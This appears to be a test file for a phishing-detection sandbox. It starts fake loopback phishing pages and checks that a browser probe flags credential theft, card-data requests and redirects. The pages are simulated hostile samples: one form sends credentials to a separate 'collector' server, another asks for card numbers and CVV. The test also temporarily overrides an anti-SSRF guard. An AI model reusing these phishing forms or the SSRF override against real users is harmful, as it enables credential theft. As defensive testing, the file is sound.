import { after, before, describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { createServer, type IncomingMessage, type Server } from 'node:http';
import type { AddressInfo } from 'node:net';
import { AntiSsrfGuard } from '../src/core/AntiSsrfGuard.js';
import { PlaywrightContextPool } from '../src/infrastructure/PlaywrightContextPool.js';
import type { IScreenshotStorage } from '../src/infrastructure/ScreenshotStorage.js';

// Páginas de phishing falsas propias, solo en loopback. El "sitio falso" vive en 127.0.0.1 y el
// "colector" del atacante en localhost: para el sandbox son dos dominios distintos.
const loginForm = (action: string) => `<!doctype html><html><body>
  <h1>Banco Ficticio</h1>
  <form method="post" action="${action}">
    <label>Correo <input type="email" name="usuario"></label>
    <label>Contraseña <input type="password" name="clave"></label>
    <button type="submit">Entrar</button>
  </form></body></html>`;

const received: Array<{ host: string; path: string; body: string }> = [];
let site: Server;
let collector: Server;
let sitePort = 0;
let collectorPort = 0;
const pools: PlaywrightContextPool[] = [];
const originalIsSafeUrl = AntiSsrfGuard.isSafeUrl;
const originalValidateDestination = AntiSsrfGuard.validateDestination;

function readBody(request: IncomingMessage): Promise<string> {
  return new Promise((resolve) => {
    let body = '';
    request.on('data', (chunk) => { body += chunk; });
    request.on('end', () => resolve(body));
  });
}

const storage: IScreenshotStorage = {
  async saveScreenshot(attemptId: string) { return `${attemptId}.webp`; },
  async getScreenshot() { return null; }
};

function newPool(probeEnabled: boolean) {
  const pool = new PlaywrightContextPool(storage, 1, undefined, 1, 25_000, probeEnabled);
  pools.push(pool);
  return pool;
}

before(async () => {
  site = createServer(async (request, response) => {
    const body = await readBody(request);
    received.push({ host: 'site', path: request.url ?? '', body });
    response.setHeader('content-type', 'text/html; charset=utf-8');
    if (request.url === '/roba-y-redirige') return response.end(loginForm(`http://localhost:${collectorPort}/colecta`));
    if (request.url === '/pide-tarjeta') return response.end(loginForm('/paso-2'));
    if (request.url === '/paso-2') {
      return response.end(`<!doctype html><html><body><h1>Verifica tu identidad</h1><form method="post" action="/fin">
        <label>Número de tarjeta <input name="cardnumber" autocomplete="cc-number"></label>
        <label>CVV <input name="cvv" autocomplete="cc-csc" maxlength="4"></label></form></body></html>`);
    }
    if (request.url === '/login-normal') return response.end(loginForm('/auth'));
    if (request.url === '/auth') return response.end('<!doctype html><html><body><p>Usuario o contraseña incorrectos</p>' +
      '<form method="post" action="/auth"><input type="email" name="usuario"><input type="password" name="clave"></form></body></html>');
    response.statusCode = 404;
    response.end('no encontrado');
  });
  collector = createServer(async (request, response) => {
    const body = await readBody(request);
    received.push({ host: 'collector', path: request.url ?? '', body });
    if (request.url === '/colecta') {
      response.writeHead(302, { location: `http://localhost:${collectorPort}/inicio` });
      return response.end();
    }
    response.setHeader('content-type', 'text/html; charset=utf-8');
    response.end('<!doctype html><html><body><h1>Inicio</h1></body></html>');
  });
  await new Promise<void>((resolve) => site.listen(0, '127.0.0.1', resolve));
  await new Promise<void>((resolve) => collector.listen(0, '127.0.0.1', resolve));
  sitePort = (site.address() as AddressInfo).port;
  collectorPort = (collector.address() as AddressInfo).port;

  // Excepción controlada del filtro anti-SSRF solo para estos dos servidores de prueba.
  const allowed = (url: URL) => (url.hostname === '127.0.0.1' && url.port === String(sitePort)) ||
    (url.hostname === 'localhost' && url.port === String(collectorPort));
  AntiSsrfGuard.isSafeUrl = (value: string) => {
    const parsedUrl = new URL(value);
    return allowed(parsedUrl) ? { valid: true, parsedUrl } : originalIsSafeUrl.call(AntiSsrfGuard, value);
  };
  AntiSsrfGuard.validateDestination = async (url: URL) => allowed(url)
    ? { safe: true, resolvedIp: '127.0.0.1' }
    : originalValidateDestination.call(AntiSsrfGuard, url);
});

after(async () => {
  AntiSsrfGuard.isSafeUrl = originalIsSafeUrl;
  AntiSsrfGuard.validateDestination = originalValidateDestination;
  for (const pool of pools) await pool.close();
  await new Promise<void>((resolve) => site.close(() => resolve()));
  await new Promise<void>((resolve) => collector.close(() => resolve()));
});

describe('Prueba de credenciales inventadas (Chromium real, páginas falsas en loopback)', () => {
  it('detecta el robo hacia otro dominio y la redirección posterior', async () => {
    const result = await newPool(true).analyzeUrl('44444444-4444-4444-8444-444444444441', `http://127.0.0.1:${sitePort}/roba-y-redirige`);
    assert.equal(result.outcome, 'completed');
    if (result.outcome !== 'completed') return;
    assert.ok(result.signals.includes('credential_exfiltration_detected'), result.signals.join(','));
    assert.ok(result.signals.includes('post_login_redirect_to_other_site'), result.signals.join(','));
    assert.equal(result.verdict, 'peligroso');
    // El colector recibió solo datos inventados.
    const stolen = received.find((r) => r.host === 'collector' && r.path === '/colecta');
    assert.match(stolen?.body ?? '', /enlaceseguro\.invalid/);
    // La evidencia de la navegación original no se mezcla con lo que pasó en la prueba.
    assert.equal(result.finalDestination, `http://127.0.0.1:${sitePort}/roba-y-redirige`);
    assert.deepEqual(result.redirects, []);
  });

  it('detecta que acepta credenciales inventadas y luego pide tarjeta', async () => {
    const result = await newPool(true).analyzeUrl('44444444-4444-4444-8444-444444444442', `http://127.0.0.1:${sitePort}/pide-tarjeta`);
    assert.equal(result.outcome, 'completed');
    if (result.outcome !== 'completed') return;
    assert.ok(result.signals.includes('requests_card_data_after_login'), result.signals.join(','));
    assert.equal(result.verdict, 'peligroso');
    assert.ok(result.reasons.some((r) => r.includes('tarjeta')));
  });

  it('un login que rechaza las credenciales no genera señales de robo', async () => {
    const result = await newPool(true).analyzeUrl('44444444-4444-4444-8444-444444444443', `http://127.0.0.1:${sitePort}/login-normal`);
    assert.equal(result.outcome, 'completed');
    if (result.outcome !== 'completed') return;
    assert.ok(result.signals.includes('credential_probe_submitted'), result.signals.join(','));
    for (const s of ['credential_exfiltration_detected', 'requests_card_data_after_login', 'requests_security_code_after_login', 'post_login_redirect_to_other_site']) {
      assert.ok(!result.signals.includes(s), `${s} en ${result.signals.join(',')}`);
    }
  });

  it('apagada por defecto: no llena ni envía nada', async () => {
    const before = received.filter((r) => r.host === 'collector').length;
    const result = await newPool(false).analyzeUrl('44444444-4444-4444-8444-444444444444', `http://127.0.0.1:${sitePort}/roba-y-redirige`);
    assert.equal(result.outcome, 'completed');
    assert.ok(!result.signals.includes('credential_probe_submitted'));
    assert.equal(received.filter((r) => r.host === 'collector').length, before);
  });
});
